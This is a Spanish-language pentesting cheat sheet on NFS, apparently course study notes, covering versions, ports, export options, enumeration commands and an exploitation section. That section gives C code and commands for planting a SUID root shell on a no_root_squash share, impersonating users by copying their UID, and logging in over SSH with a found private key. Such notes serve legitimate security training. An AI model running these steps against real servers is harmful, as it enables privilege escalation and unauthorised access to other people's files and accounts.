# 📂 NFS – Resumen para Pentesting

**NFS (Network File System)** permite acceder a sistemas de archivos remotos como si fueran locales.  
Funciona principalmente entre **Linux y Unix** y se basa en **ONC-RPC (SUN-RPC)**.  

---

## 🔑 Versiones principales
| Versión | Características |
|---------|----------------|
| **NFSv2** | Antiguo, sobre UDP. |
| **NFSv3** | Archivos de tamaño variable, mejor reporting de errores. |
| **NFSv4** | Stateful, ACLs, Kerberos, multipath, solo puerto **2049** (más seguro). |

---

## ⚙️ Puertos y protocolos
- **111/tcp,udp → rpcbind**  
- **2049/tcp,udp → nfs**  
- Basado en **UID/GID numéricos** (no nombres de usuario).  
- Los nombres en `ls -l` se resuelven **localmente** con `/etc/passwd`.  

👉 Si el servidor no tiene un usuario para un UID concreto, se muestra solo el número.  

---

## 🔐 Autenticación y permisos
- Autenticación básica con **UID/GID UNIX**.  
- **Problema:** cliente y servidor pueden tener **mappings distintos de UID/GID**.  
- Esto permite crear en el cliente un usuario con el mismo **UID** que un usuario en el servidor y así acceder a sus ficheros.  

---

## 📌 Opciones de configuración (`/etc/exports`)
Ejemplo:
```bash
/mnt/nfs  10.129.14.0/24(rw,sync,no_subtree_check)
```

### Opciones comunes
- `rw` → lectura y escritura  
- `ro` → solo lectura  
- `sync` / `async` → transferencia segura/rápida  
- `root_squash` → UID 0 (root) se asigna a `nobody` (seguro)  
- `no_root_squash` → UID 0 se mantiene como root (inseguro)  
- `secure` / `insecure` → restringir puertos <1024 o permitir >1024  

---

## ⚠️ Configuraciones peligrosas
- **`no_root_squash`** → el root del cliente puede crear archivos como root en el servidor → subir binarios **SUID root**.  
- **UID mappings inseguros** → cualquier usuario puede suplantar a otro creando un usuario local con el mismo UID.  
- **Archivos sensibles expuestos** (`id_rsa`, `shadow`, backups).  

---

## 🔎 Enumeración de NFS
Escaneo básico:
```bash
sudo nmap -p111,2049 -sV -sC <IP>
```

Scripts NSE para NFS:
```bash
sudo nmap --script nfs* -p111,2049 <IP>
```

Listar exports:
```bash
showmount -e <IP>
```

Montar share:
```bash
mkdir target-NFS
sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
```

Desmontar:
```bash
sudo umount ./target-NFS
```

---

## 🚩 Explotación en Pentesting

### 1️⃣ `no_root_squash`
- Montas el share como root.  
- Creas un binario SUID con root como propietario:
  ```c
  #include <unistd.h>
  int main() { setuid(0); system("/bin/bash"); }
  ```
  ```bash
  gcc rootsh.c -o rootsh
  chmod +s rootsh
  cp rootsh /mnt/nfs/
  ```
- En la víctima, ese binario será **SUID root** → ejecución como root.  

---

### 2️⃣ Suplantación de usuarios por UID
- En el NFS ves un archivo con UID 2000:
  ```
  -rw-r--r-- 1 2000 2000  123 ago 18 14:20 secret.txt
  ```
- Creas un usuario con ese UID en tu cliente:
  ```bash
  sudo useradd -u 2000 attacker2000
  sudo passwd attacker2000
  su - attacker2000
  ```
- Ahora, montando el NFS, podrás leer/escribir archivos de UID 2000.  
- Incluso puedes subir una shell SUID con ese UID → la víctima la ejecutará como ese usuario.  

---

### 3️⃣ Archivos sensibles
Si en el share aparece algo como `id_rsa`:  
```bash
chmod 600 id_rsa
ssh -i id_rsa usuario@victima
```
👉 Acceso directo vía SSH como ese usuario.  

---

## ✅ Resumen práctico
- **`root_squash` activado:** protege contra root, pero aún puedes explotar UID mappings.  
- **`no_root_squash`:** permite subir binarios SUID root → escalada total.  
- **NFS solo entiende de UID/GID**, no de nombres → podemos “fabricar” usuarios con UID específicos para acceder a ficheros que no deberíamos.  
